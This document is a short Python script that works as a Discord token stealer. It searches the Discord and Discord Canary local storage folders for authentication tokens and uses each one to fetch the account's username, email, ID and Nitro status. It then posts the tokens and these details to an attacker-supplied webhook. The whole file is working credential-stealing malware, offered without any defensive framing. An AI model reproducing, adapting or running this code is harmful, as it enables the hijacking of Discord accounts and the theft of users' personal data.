import os, re, requests, platform

WEBHOOK = "YOUR WEBHOOK LINK HERE"
APPDATA = os.getenv("APPDATA") if platform.system() == "Windows" else os.getenv('XDG_CONFIG_HOME', os.getenv('HOME')+'/.config') if platform.system() == "Linux" else None
TOKENS = []
DIRS = [f"{APPDATA}\\Discord\\Local Storage\\leveldb", f"{APPDATA}\\discordcanary\\Local Storage\\leveldb"]

def post():
    for token in TOKENS:
        _data = requests.get("https://discordapp.com/api/v6/users/@me", headers={"authorization": token})

        if _data.status_code != 404 or _data.status_code != 401:
            _info = _data.json()
            _payload = {"content": f'''
```asciidoc
= {_info["username"]}#{_info["discriminator"]} =
TOKEN :: {token}
EMAIL :: {_info["email"]}
ID :: {_info["id"]}
NITRO :: {"Yes" if _info['premium_type'] else "No"}
```'''}
            requests.post(WEBHOOK, json=_payload)

def getTokens():
        for location in DIRS:
            if os.path.isdir(location):
                for file in os.listdir(location):
                    try:
                        with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _file:
                            tokenSearch = re.findall(r"N\w+\.\w+\.\w+|mfa\.\w+\-\_?\w+\-\_?\w+", _file.read())
                            if tokenSearch:
                                for token in tokenSearch:
                                    TOKENS.append(token)
                    except:
                        continue
            else:
                continue


if __name__ == "__main__":
    getTokens()
    post()
